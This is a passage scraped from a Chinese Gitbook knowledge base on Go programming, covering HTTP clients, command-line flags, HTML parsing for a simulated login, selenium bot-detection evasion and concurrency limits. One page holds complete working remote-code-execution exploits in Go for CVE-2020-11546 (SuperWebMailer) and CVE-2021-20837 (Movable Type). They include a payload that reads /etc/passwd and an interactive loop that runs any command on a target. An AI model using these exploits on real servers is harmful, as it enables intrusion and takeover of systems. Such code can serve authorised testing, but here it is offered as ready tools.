POST / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Content-Length: 5 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip aa=bb 方法二：使用http.PostForm，相对简单，但是无法设置content-type，没那么自由 package main import ( \"net/http\" \"net/url\" ) func main() { u := \"http://127.0.0.1:8000\" param := url.Values{} param.Set(\"aaa\", \"bbb\") http.PostForm(u, param) } 收到的http请求 POST / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Content-Length: 7 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip aaa=bbb 自定义POST请求 和get差不多，只不过是多了设置content-type和post数据的步骤而已 举例为发送json数据 package main import ( \"bytes\" \"encoding/json\" \"net/http\" ) func main() { // 创建请求，但是不发起 u := \"http://127.0.0.1:8000\" param := map[string]string{ \"aa\": \"bb\", \"name\": \"d4m1ts\", } buf, _ := json.Marshal(param) // 序列化的json req, _ := http.NewRequest(\"POST\", u, bytes.NewReader(buf)) req.Header.Set(\"User-Agent\", \"UA TEST\") req.Header.Set(\"Content-Type\", \"application/json\") // 发送刚才的请求 client := http.Client{} client.Do(req) } 收到的http数据包 POST / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: UA TEST Content-Length: 27 Content-Type: application/json Accept-Encoding: gzip {\"aa\":\"bb\",\"name\":\"d4m1ts\"} 忽略证书 有些时候一些ssl网站因为证书问题也会抛出panic异常，所以一般可以忽略SSL证书，在初始化http客户端的时候忽略，代码如下 tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略SSL证书 } Client := http.Client{ Transport: tr, } cookieJar和代理设置 // 初始化Client jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) proxy,_ := url.Parse(\"socks5://127.0.0.1:1080\") netTransport := &http.Transport{ Proxy: http.ProxyURL(proxy), MaxIdleConnsPerHost: 10, ResponseHeaderTimeout: time.Second * time.Duration(5), } Client = http.Client{ Transport: netTransport, Jar: jar, Timeout: time.Second * 10, } Client.Get(\"http://cip.cc\") gzip解压 有些返回的数据是二进制乱码的，这个时候我们就需要进行gzip解压 resp, _ := Client.Do(req) reader,_ := gzip.NewReader(resp.Body) source, _ := ioutil.ReadAll(reader) fmt.Println(string(source)) go flag 这个库主要用来判断工具命令行传入的参数用的 虽然go有os.Args，但是不如这个好用 演示： func main() { var filePath string flag.StringVar(&filePath, \"file\", \"\", \"markdown文件路径\") flag.Parse() if flag.Lookup(\"file\").DefValue == flag.Lookup(\"file\").Value.String() { // 避免使用默认参数，所以加个判断 flag.Usage() } if flag.NFlag() == 0 { // 使用的命令行参数个数，这个地方可以用来判断用户是否输入参数（程序正常情况下会使用默认参数） flag.Usage() os.Exit(0) } } [!NOTE] 还有一些其他的参数，可以自己研究下，基本上看到名字就知道啥意思，主要用的就上面那些 如果觉得帮助不好看，可以重写flag.Usage()这个方法 flag.Usage = func() { fmt.Fprintf(flag.CommandLine.Output(), \"markdown图片自动上传到图床\\nUsage of %s:\\n\", os.Args[0]) flag.PrintDefaults() } 颜色输出 最简单的版本 package main import \"fmt\" func main() { fmt.Printf(\"\\033[1;31;40m%s\\033[0m\\n\",\"Red.\") fmt.Printf(\"\\033[1;37;41m%s\\033[0m\\n\",\"Red.\") } 输出所有颜色 package main import \"fmt\" func main() { for b := 40; b 但是每一次都这样很难记住，所以已经有人给他封装成了一个包：https://github.com/fatih/color，可以快速看下它的说明文档 实例： package main import ( \"github.com/fatih/color\" ) func main() { color.Blue(\"aaaa%scccc\", \"bbb\") color.Red(\"red red\") color.Magenta(\"And many others ..\") } 参考 Golang标准库文档 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:15:18 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/01.GO/02.GO实例/01.GO常用基础实例.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/01.GO/02.GO实例/02.使用GO编写POC.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/02.使用GO编写POC.html","title":"02.使用GO编写POC","keywords":"","body":" CVE-2020-11546 扩展1：交叉编译 扩展2：go.mod 扩展3：go get 扩展4：交互输入 代码 测试图 CVE-2021-20837 扩展5：忽略SSL证书 扩展6：正则表达式 代码 测试图 CVE-2020-11546 [!NOTE] 已上传至GitHub:https://github.com/damit5/CVE-2020-11546 扩展1：交叉编译 CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_darwin CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_linux CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_win.exe 扩展2：go.mod go mod init go mod init github.com/damit5/CVE-2020-11546 不然不能go get -u自动下载编译，会出现问题 扩展3：go get 直接使用go get -u github.com/xxx可能出现版本的问题，可以使用如下命令执行版本或者分支 go get -u -v github.com/damit5/CVE-2020-11546@master [!TIP] 也可以使用@commit hash等等 http://icattlecoder.github.io/2019/03/29/go-module-and-version.html https://zhuanlan.zhihu.com/p/103534192 扩展4：交互输入 for { fmt.Printf(\"\\n\\ncommand: \") _, _ = fmt.Scanln(&command) if command != \"\" { break } } 代码 package main import ( \"bytes\" \"fmt\" \"io/ioutil\" \"net/http\" \"os\" \"strings\" ) func banner(){ fmt.Println(` .___ _____ ____ __ __| _// | | _____/_ |/ |_ ______ / __ |/ | |_/ \\| \\ __\\/ ___/ / /_/ / ^ / Y Y \\ || | \\___ \\ \\____ \\____ ||__|_| /___||__| /____ > \\/ |__| \\/ \\/ CVE-2020-11546 `) } /* * 参数检查 */ func argsCheck(args []string) { if len(args) != 2 { fmt.Printf(\"Usage:\\n\\t./%s \\n\", args[0]) os.Exit(0) } } /* * url处理 */ func urlHandler(target string) string { // 没有http前缀的添加http前缀 if !strings.HasPrefix(target, \"http\") { target = \"http://\" + target } // 有/结尾的就去掉/ if strings.HasSuffix(target, \"/\") { // 去掉后缀 / target = strings.TrimSuffix(target, \"/\") fmt.Println(target) } return target } /* * 漏洞检查 */ func check(target string) bool { // 创建请求 vulurl := target + \"/mailingupgrade.php\" req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(`step=4&Language=de%7b$%7bsystem(%22echo vultest%22)%7d%7d&RegName=12345678901234567890123&RegNumber=12345&NextBtn=Weiter+%3E`))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"application/x-www-form-urlencoded\") // 发起请求 client := http.Client{} resp, _ := client.Do(req) body, _ := ioutil.ReadAll(resp.Body) if strings.Contains(string(body), \"vultest\") { return true } return false } /* * 漏洞检查 */ func exp(target string, command string) { // 创建请求 vulurl := target + \"/mailingupgrade.php\" data := `step=4&Language=de%7b$%7bsystem(%22` + command + `%22)%7d%7d&RegName=12345678901234567890123&RegNumber=12345&NextBtn=Weiter+%3E` req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(data))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"application/x-www-form-urlencoded\") // 发起请求 client := http.Client{} resp, _ := client.Do(req) body, _ := ioutil.ReadAll(resp.Body) res := strings.Replace(string(body), \"Can't load correct language file in /language directory\", \"\", -1) res = strings.TrimSpace(res) fmt.Println(res) } func main() { args := os.Args banner() argsCheck(args) target := args[1] target = urlHandler(target) if check(target) { fmt.Printf(\"target %s is vuln\", target) var command string for { for { fmt.Printf(\"\\n\\ncommand: \") fmt.Scanln(&command) if command != \"\" { break } } exp(target, command) } } else { fmt.Printf(\"target %s is not vuln\", target) } } 测试图 CVE-2021-20837 扩展5：忽略SSL证书 [!WARNING] 这个错误不容易发现，所以需要经验来判断，在初始化客户端的时候需要忽略SSL证书 var Client http.Client tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略SSL证书 } Client = http.Client{ Transport: tr, } 扩展6：正则表达式 默认情况下，.是不能匹配换行符\\n的，有时候我们有需要通过.匹配到\\n，这个时候就需要稍微修改一下.了 [!TIP] 在线正则表达式测试网站：https://regex101.com/ (?s).* 实例： 代码 package main import ( \"bytes\" \"crypto/tls\" \"encoding/base64\" \"fmt\" \"io/ioutil\" \"net/http\" \"os\" \"regexp\" \"strings\" ) // 客户端全局变量 var Client http.Client func banner(){ fmt.Println(` .___ _____ ____ __ __| _// | | _____/_ |/ |_ ______ / __ |/ | |_/ \\| \\ __\\/ ___/ / /_/ / ^ / Y Y \\ || | \\___ \\ \\____ \\____ ||__|_| /___||__| /____ > \\/ |__| \\/ \\/ CVE-2021-20837 `) } /* * 参数检查 */ func argsCheck(args []string) { if len(args) != 2 { fmt.Printf(\"Usage:\\n\\t./%s \\n\", args[0]) os.Exit(0) } } /* * url处理 */ func urlHandler(target string) string { // 没有http前缀的添加http前缀 if !strings.HasPrefix(target, \"http\") { target = \"http://\" + target } // 有/结尾的就去掉/ if strings.HasSuffix(target, \"/\") { // 去掉后缀 / target = strings.TrimSuffix(target, \"/\") fmt.Println(target) } return target } /* * 漏洞检查 */ func check(target string) bool { // 创建请求 vulurl := target + \"/cgi-bin/mt/mt-xmlrpc.cgi\" command := \"`cat /etc/passwd`\" base64_cmd := base64.StdEncoding.EncodeToString([]byte(command)) payload := fmt.Sprintf(` mt.handler_to_coderef %s `, base64_cmd) req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(payload))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"text/xml; charset=UTF-8\") // 发起请求 tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略SSL证书 } Client = http.Client{ Transport: tr, } resp, _ := Client.Do(req) body, _ := ioutil.ReadAll(resp.Body) if strings.Contains(string(body), \"root:x:0\") { return true } return false } /* * 漏洞检查 */ func exp(target string, command string) { // 创建请求 vulurl := target + \"/cgi-bin/mt/mt-xmlrpc.cgi\" base64_cmd := base64.StdEncoding.EncodeToString([]byte(\"`\" + command + \"`\")) payload := fmt.Sprintf(` mt.handler_to_coderef %s `, base64_cmd) req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(payload))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"text/xml; charset=UTF-8\") // 发起请求 resp, _ := Client.Do(req) body, _ := ioutil.ReadAll(resp.Body) // 正则表达式匹配结果 regex, _ := regexp.Compile(\"Can't\\\\slocate\\\\s((?s).*)\\\\sin @INC\") res := regex.FindAllStringSubmatch(string(body), 1)[0][1] fmt.Println(res) } func main() { args := os.Args banner() argsCheck(args) target := args[1] target = urlHandler(target) if check(target) { fmt.Printf(\"target %s is vuln\", target) var command string for { for { fmt.Printf(\"\\n\\ncommand: \") _, _ = fmt.Scanln(&command) if command != \"\" { break } } exp(target, command) } } else { fmt.Printf(\"target %s is not vuln\", target) } } 测试图 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:14:52 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/01.GO/02.GO实例/02.使用GO编写POC.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/01.GO/02.GO实例/03.使用GO模拟登陆.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/03.使用GO模拟登陆.html","title":"03.使用GO模拟登陆","keywords":"","body":" 前期准备 goquery基础用法 创建document实例 标签选择器 ID选择器 class选择器 属性选择器 内容提取 parent>child子选择器 prev+next相邻选择器 prev~next兄弟选择器 内容过滤器 :first-of-type过滤器 :nth-child(n) 过滤器系列 :only-child 过滤器系列 选择器或(|)运算 补充说明 Cookie自动保存更新 实战 前期准备 本次为了方便解析html，快速提取登陆时需要的一些数据，类似python中的bs4，而不是采用正则表达式去匹配数据，所以会用到一个新的库 goquery：https://github.com/PuerkitoBio/goquery 安装： go get -v github.com/PuerkitoBio/goquery goquery基础用法 [!NOTE] 大部分内容匹配规则和jquery类似 以 https://cloud.ctfd.io/login 页面为例 创建document实例 req, _ := http.NewRequest(\"GET\", \"https://cloud.ctfd.io/login\", nil) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") client := &http.Client{} resp, _ := client.Do(req) // 参数类型为 io.Reader dom, _ := goquery.NewDocumentFromReader(resp.Body) 标签选择器 这个比较简单，就是基于a,p等这些HTML的基本元素进行选择，这种直接使用Element名称作为选择器即可。比如dom.Find(\"div\") 实例：找到所有的a标签，并循环获取值（不是属性，是标签中的值） dom.Find(\"a\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) }) Features Pricing Store Contact Login Sign Up Don't have an account? Sign Up # 和截图匹配的这一条 Forgot password? Exiting. ID选择器 通过ID定位到元素，算是最常用的之一 实例：比如我们要定位到id=\"navbarResponsive\"的元素，输出它的源码，不过需要注意的是，输出源码并不会输出当前的标签 selection := dom.Find(\"#navbarResponsive\") // selection := dom.Find(\"div#navbarResponsive\") // 同时匹配标签和id，更准确 fmt.Println(selection.Html()) Features Pricing Store Contact Login Sign Up class选择器 它的用法和ID选择器类似，为Find(\".class\") 实例：寻找所有class=\"nav-link元素，并输出他们的值 dom.Find(\".nav-link\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) }) [!TIP] 也可以组合，如 a.nav-link：寻找所有a标签且class为nav-link的元素 Features Pricing Store Contact Login Sign Up 属性选择器 上面3种有时候还不够用，这个时候就需要属性选择器来帮忙了 实例：获取input标签中属性name为nonce的元素的value值 [!Note] 就是获取红框中的值，这里放图了下面就不放了 res, exist := dom.Find(\"input[name=nonce]\").Attr(\"value\") if exist { fmt.Println(res) // YidceDA0XHhhZVx4YmE9XHgxNFx4MTVceDhlXHgxNC9ceGUyJw== } 补充： 除了完全相等，还有其他匹配方式，使用方式类似，这里统一列举下，不再举例 选择器 说明 Find(\"div[lang]\") 筛选含有lang属性的div元素 Find(\"div[lang=zh]\") 筛选lang属性为zh的div元素 Find(\"div[lang!=zh]\") 筛选lang属性不等于zh的div元素 Find(\"div[lang¦=zh]\") 筛选lang属性为zh或者zh-开头的div元素 Find(\"div[lang*=zh]\") 筛选lang属性包含zh这个字符串的div元素 Find(\"div[lang~=zh]\") 筛选lang属性包含zh这个单词的div元素，单词以空格分开的 Find(\"div[lang$=zh]\") 筛选lang属性以zh结尾的div元素，区分大小写 Find(\"div[lang^=zh]\") 筛选lang属性以zh开头的div元素，区分大小写 以上是属性筛选器的用法，都是以一个属性筛选器为例，当然你也可以使用多个属性筛选器组合使用，比如： Find(\"div[id][lang=zh]\"),用多个中括号连起来即可。当有多个属性筛选器的时候，要同时满足这些筛选器的元素才能被筛选出来 内容提取 获取到了标签，当然就像获取到里面的值了 parent>child子选择器 [!NOTE] 上面的基本都够用了，这里再列举一些可能会用到的筛选器 如果我们想筛选出某个元素下符合条件的子元素，我们就可以使用子元素筛选器，它的语法为Find(\"parent>child\"),表示筛选parent这个父元素下，符合child这个条件的最直接（一级）的子元素。 实例：form标签下的input标签的属性value的值 res, exist := dom.Find(\"form>input\").Attr(\"value\") if exist { fmt.Println(res) // YiJceGU0YTxceGY3alx4MGYnVVx4ZDdceGNlIg== } prev+next相邻选择器 假设我们要筛选的元素没有规律，但是该元素的上一个元素有规律，我们就可以使用这种下一个相邻选择器来进行选择。 实例：h2标签旁边的p标签的值 [!TIP] 如果class的值存在空格，那么可以用属性的格式来匹配，防止空格影响结果 dom.Find(\"h2[class='block-title text-center']+p.text-center\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) // Don't have an account? Sign Up }) prev~next兄弟选择器 有相邻就有兄弟，兄弟选择器就不一定要求相邻了，只要他们共有一个父元素就可以。 实例：获取lable标签的兄弟标签input dom.Find(\"label~input\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Attr(\"name\")) // email true }) 内容过滤器 有时候我们使用选择器选择出来后，希望再过滤一下，这时候就用到过滤器了 实例：获取包含内容Email的label标签 dom.Find(\"label:contains(Email)\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) // Email Address }) 扩展： Find(\":contains(text)\")表示筛选出的元素要包含指定的文本 Find(\":empty\")表示筛选出的元素都不能有子元素（包括文本元素），只筛选那些不包含任何子元素的元素 Find(\":has(selector)\")和contains差不多，只不过这个是包含的是元素节点:first-of-type过滤器 :first-child选择器限制的比较死，必须得是第一个子元素，如果该元素前有其他在前面，就不能用:first-child了，这时候:first-of-type就派上用场了，它要求只要是这个类型的第一个就可以 实例：输出第一个div标签的源码ret, _ := dom.Find(\"div:first-of-type\").Html() fmt.Println(ret) 扩展： :last-child 和 :last-of-type过滤器正好和上面的2歌过滤器相反，表示最后一个过滤器:nth-child(n) 过滤器系列 表示筛选出的元素是其父元素的第n个元素，n以1开始。所以我们可以知道:first-child和:nth-child(1)是相等的。通过指定n，我们就很灵活的筛选出我们需要的元素 同样，:nth-of-type(n)和 :nth-child(n) 类似，只不过它表示的是同类型元素的第n个,所以:nth-of-type(1) 和 :first-of-type是相等的 nth-last-child(n) 和:nth-last-of-type(n) 过滤器是倒序开始计算的，最后一个元素被当成了第一个 [!WARNING] 都不举例了，没必要 :only-child 过滤器系列 Find(\":only-child\") 过滤器，从字面上看，可以猜测出来，它表示筛选的元素，在其父元素中，只有它自己，它的父元素没有其他子元素，才会被匹配筛选出来。 :only-of-type 过滤器和其他的类似，同类型元素只要只有一个，就可以被筛选出来 选择器或(|)运算 如果我们想同时筛选出div,span等元素怎么办？这时候可以采用多个选择器进行组合使用，并且以逗号(,)分割，Find(\"selector1, selector2, selectorN\")表示，只要满足其中一个选择器就可以被筛选出来，也就是选择器的或(|)运算操作。 实例：筛选出所有的meta标签和input标签，并且获取到其属性name的值 dom.Find(\"meta,input\").Each(func(i int, selection *goquery.Selection) { val, exists := selection.Attr(\"name\") if exists { fmt.Println(val) } }) viewport description author twitter:card twitter:site twitter:creator twitter:title twitter:description twitter:image email password nonce 补充说明 1、类似函数的位置操作 方法 说明 Find(selection) *Selection 根据选择器查找节点集 Eq(index int) *Selection 根据索引获取某个节点集 First() *Selection 获取第一个子节点集 Last() *Selection 获取最后一个子节点集 Next() *Selection 获取下一个兄弟节点集 NextAll() *Selection 获取后面所有兄弟节点集 Prev() *Selection 前一个兄弟节点集 Get(index int) *html.Node 根据索引获取一个节点 Index() int 返回选择对象中第一个元素的位置 Slice(start, end int) *Selection 根据起始位置获取子节点集 2、循环遍历选择的节点 方法 说明 Each(f func(int, *Selection)) *Selection 遍历 EachWithBreak(f func(int, *Selection) bool) *Selection 可中断遍历 Map(f func(int, *Selection) string) (result []string) 返回字符串数组 3、检测或获取节点属性值 方法 说明 Attr(), RemoveAttr(), SetAttr() 获取，移除，设置属性的值 AddClass(), HasClass(), RemoveClass(), ToggleClass() 类相关 Html() 获取该节点的html Length() 返回该Selection的元素个数 Text() 获取该节点的文本值 4、 在文档树之间来回跳转（常用的查找节点方法） 方法 说明 Children() 返回selection中各个节点下的孩子节点 Contents() 获取当前节点下的所有节点 Find() 查找获取当前匹配的元素 Next() 下一个元素 Prev() 上一个元素 Cookie自动保存更新 [!NOTE] 大家都知道，网站登陆后肯定有个用来鉴权的东西，而Cookie和token居多，这里我们讲一下用Cookie [!DANGER] 网上直接搜go模拟登陆，但是出来的代码都是登陆后手动设置req的cookie，而不会自动的更新cookie，既然python里面都有request.Session，那golang里面肯定也有类似的东西吧！ 结合之前的经验，发现在创建客户端的时候，会传入一个CookieJar，这玩意儿根据经验肯定是用来存放Cookie的 试一下便知 根据经验，第一次访问百度的时候，百度会给咱们分配cookie，那咱们就可以用它来试试能不能自动保存更新Cookie 然后根据它的参数构造一个CookieJar出来 jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) 再创建个http客户端给它放进去，发起请求，查看结果 package main import ( \"fmt\" \"golang.org/x/net/publicsuffix\" \"net/http\" \"net/http/cookiejar\" ) func main() { // 创建客户端 jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) client := http.Client{Jar: jar} fmt.Printf(\"访问前：\\n\") fmt.Println(client.Jar) client.Get(\"https://www.baidu.com\") fmt.Printf(\"\\n\\n访问后：\\n\") fmt.Println(client.Jar) } 可以看到我们的Cookie成功自动保存了，那就说明之前的猜想是对的 后面对百度发起访问，就会自动带上Cookie了 实战 实战模拟登陆CTFD平台：https://cloud.ctfd.io/login 主要分为3步： 获取nonce 登陆 验证登陆是否成功 完整代码： package main import ( \"fmt\" \"github.com/PuerkitoBio/goquery\" \"golang.org/x/net/publicsuffix\" \"io/ioutil\" \"net/http\" \"net/http/cookiejar\" \"net/url\" \"strings\" ) // 登陆账号密码 var Config = map[string]string{ \"email\": \"yeciyar420@zherben.com\", \"passwd\": \"xxxxx\", } // 登陆客户端 var Client http.Client /* * 1. 获取登陆需要的Nonce，同时初始化客户端 */ func getNonce() string { req, _ := http.NewRequest(\"GET\", \"https://cloud.ctfd.io/login\", nil) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") // 初始化client jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) Client = http.Client{Jar: jar} resp, _ := Client.Do(req) dom, _ := goquery.NewDocumentFromReader(resp.Body) val, _ := dom.Find(\"input[name=nonce]\").Attr(\"value\") return val } /* * 2. 登陆 */ func login(nonce string) (bool) { // 构造请求 param := url.Values{} param.Set(\"email\", Config[\"email\"]) param.Set(\"password\", Config[\"passwd\"]) param.Set(\"nonce\", nonce) data := param.Encode() req, _ := http.NewRequest(\"POST\", \"https://cloud.ctfd.io/login\", strings.NewReader(data)) req.Header.Set(\"authority\", \"cloud.ctfd.io\") req.Header.Set(\"content-type\", \"application/x-www-form-urlencoded\") req.Header.Set(\"user-agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") req.Header.Set(\"referer\", \"https://cloud.ctfd.io/admin\") // 发起请求 resp, _ := Client.Do(req) source, _ := ioutil.ReadAll(resp.Body) if strings.Contains(string(source), \"Your password is wrong\"){ fmt.Println(\"账号或密码错误\") return false } else { return true } } /* * 3. 验证是否登陆成功 */ func getInfo() { req, _ := http.NewRequest(\"GET\", \"https://cloud.ctfd.io/profile\", nil) req.Header.Set(\"authority\", \"cloud.ctfd.io\") req.Header.Set(\"content-type\", \"application/x-www-form-urlencoded\") req.Header.Set(\"user-agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") req.Header.Set(\"referer\", \"https://cloud.ctfd.io/admin\") resp, _ := Client.Do(req) if resp.StatusCode == 200 { dom, _ := goquery.NewDocumentFromReader(resp.Body) val, exists := dom.Find(\"#name-input\").Attr(\"value\") if exists { fmt.Printf(\"Success, Login as %s\\n\", val) } } } func main() { nonce := getNonce() fmt.Println(\"Nonce: \", nonce) res := login(nonce) if res { fmt.Println(\"登陆成功，尝试获取个人信息...\") getInfo() } } 效果： Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:14:57 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/01.GO/02.GO实例/03.使用GO模拟登陆.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/01.GO/02.GO实例/04.使用GO+selenium.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/04.使用GO+selenium.html","title":"04.使用GO+selenium","keywords":"","body":" 前言 安装 基础使用 反爬 使用firefox 配置Chrome 前言 有的网站存在反爬机制，有的网站存在复杂的前端加密等等情况 这个时候就可以用selenium来模拟用户操作，简化我们的分析绕过时间 推荐：https://github.com/tebeka/selenium 安装 安装这个依赖包 go get -t -d github.com/tebeka/selenium 下载依赖 # 找到刚才下载的源码的路径 # 我的在 $GOPATH/pkg/mod/github.com/tebeka/selenium@v0.9.9/ cd vendor go run init.go --alsologtostderr --download_browsers --download_latest [!WARNING|style:flat] 下载依赖可能会遇到问题，没问题最好 手动安装：对应不同类型的浏览器进行安装 WebDriver，Google Chrome 需要安装 ChromeDriver，Firefox 则需要安装 geckodriver 安装的driver版本一定要和浏览器版本一致 基础使用 [!NOTE] 示例：https://github.com/tebeka/selenium/blob/master/example_test.go 文档：https://pkg.go.dev/github.com/tebeka/selenium#readme-documentation 实例：打开baidu.com然后搜索123123 数据那一块和python操作Selenium的方法都差不多 package main import ( \"fmt\" \"github.com/tebeka/selenium\" \"io/ioutil\" \"os\" ) const ( chromeDriverPath = \"/usr/local/bin/chromedriver\" port = 12345 ) func main() { // 创建driver服务实例 options := []selenium.ServiceOption{ //selenium.GeckoDriver(geckoDriverPath), // Specify the path to GeckoDriver in order to use Firefox. selenium.Output(os.Stderr), } selenium.SetDebug(true) service, err := selenium.NewChromeDriverService(chromeDriverPath, port, options...) if err != nil { panic(err) } defer service.Stop() // 连接到本地运行的WebDriver实例。 caps := selenium.Capabilities{ \"browserName\": \"chrome\", } wd, err := selenium.NewRemote(caps, fmt.Sprintf(\"http://localhost:%d/wd/hub\", port)) if err != nil { panic(err) } defer wd.Quit() // 发起请求 _ = wd.Get(\"http://www.baidu.com/\") // 截屏 img, _ := wd.Screenshot() _ = ioutil.WriteFile(\"a.png\", img, 0666) element, _ := wd.FindElement(selenium.ByID, \"kw\") _ = element.Clear() // 方法一 _ = element.SendKeys(\"123123\") // 方法二 //_ = element.SendKeys(` // package main // import fmt // func main(){ // fmt.Println(\"hello\") // } // `) button, _ := wd.FindElement(selenium.ByID, \"su\") _ = button.Click() source, _ := wd.PageSource() fmt.Println(source) // 避免直接关闭chromnium页面，构造一个输入 var name string fmt.Scanln(&name) } 反爬 使用firefox https://gist.github.com/jacoduplessis/322d695d4cdab6ce866b939964588642 配置Chrome Chrome启动参数大全/* 利用Selenium去获取网页的源码，有的有反爬机制，返回源码 */ func seleniumGetSource(url string) string { // 连接到本地运行的WebDriver实例。 caps := selenium.Capabilities{ \"browserName\": \"Google Chrome\", } //禁止图片加载，加快渲染速度 imagCaps := map[string]interface{}{ \"profile.managed_default_content_settings.images\": 2, } // chrome设置 chromeCaps := chrome.Capabilities{ Prefs: imagCaps, Path: \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\", Args: []string{ //静默执行请求 //\"--headless\", // 设置Chrome无头模式，在linux下运行，需要设置这个参数，否则会报错 \"--no-sandbox\", \"--user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.11\", // 模拟user-agent，防反爬, \"--disable-blink-features=AutomationControlled\", // 从 Chrome 88 开始，它的 V8 引擎升级了，加了这个参数，window.navigator.webdriver=false \"--proxy-server=socks5://127.0.0.1:1080\", }, ExcludeSwitches: []string{ \"enable-automation\", // 禁用左上角的控制显示 }, } caps.AddChrome(chromeCaps) wd, err := selenium.NewRemote(caps, fmt.Sprintf(\"http://localhost:%d/wd/hub\", port)) if err != nil { panic(err) } defer wd.Quit() // 发起请求 _ = wd.Get(url) time.Sleep(time.Second*5) source, _ := wd.PageSource() //res, _ := wd.ExecuteScriptRaw(\"console.log(\\\"123123\\\" + window.navigator.webdriver)\", nil) //fmt.Println(string(res)) var x string _, _ = fmt.Scanln(&x) return source } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:14:57 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/01.GO/02.GO实例/04.使用GO+selenium.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/01.GO/02.GO实例/05.限制GO并发数.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/05.限制GO并发数.html","title":"05.限制GO并发数","keywords":"","body":" 前言 尝试chan 尝试sync 尝试chan+sync√ 信号量Semaphore 协程池 参考 前言 开发过程中，如果不限制并发数，如下代码这种，可能直接造成服务器宕机，而且很多结果不会输出 [!TIP|style:flat] 很多结果不会输出，是因为主协程结束时，子协程也会终止掉。 func main() { userCount := math.MaxInt64 for i := 0; i 尝试chan package main import ( \"fmt\" \"math\" \"time\" ) func out(i int, semaphore chan bool){ fmt.Printf(\"go func: %d\\n\", i) // 释放通道 确实可以2个协程并发，但是和上面结果一样，很多结果不会输出，是因为主协程结束时，子协程也会终止掉。 go func: 1 go func: 0 go func: 3 go func: 4 go func: 5 go func: 6 go func: 7 go func: 8 尝试sync 主要使用sync.WaitGroup{} package main import ( \"fmt\" \"math\" \"sync\" \"time\" ) var wg = sync.WaitGroup{} func out(i int){ fmt.Printf(\"go func: %d\\n\", i) time.Sleep(time.Second) wg.Done() } func main() { userCount := math.MaxInt8 for i := 0; i 